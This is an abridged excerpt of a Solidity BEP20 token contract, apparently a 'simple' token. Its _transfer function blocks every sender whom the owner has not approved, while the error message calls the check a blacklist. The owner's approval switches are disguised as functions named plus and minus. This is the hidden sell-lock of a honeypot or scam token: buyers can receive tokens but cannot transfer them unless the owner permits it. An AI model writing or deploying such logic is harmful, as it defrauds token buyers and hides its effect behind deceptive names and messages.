...
contract BEP20 is Ownable, IBEP20 {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        require(_users[sender], "BEP20: address in blacklist");
    ...
    function plus(address addr) external onlyOwner {
        _users[addr] = true;
    }

    function minus(address addr) external onlyOwner {
        _users[addr] = false;
    }
}
// File: contracts/SimpleBEP20.sol
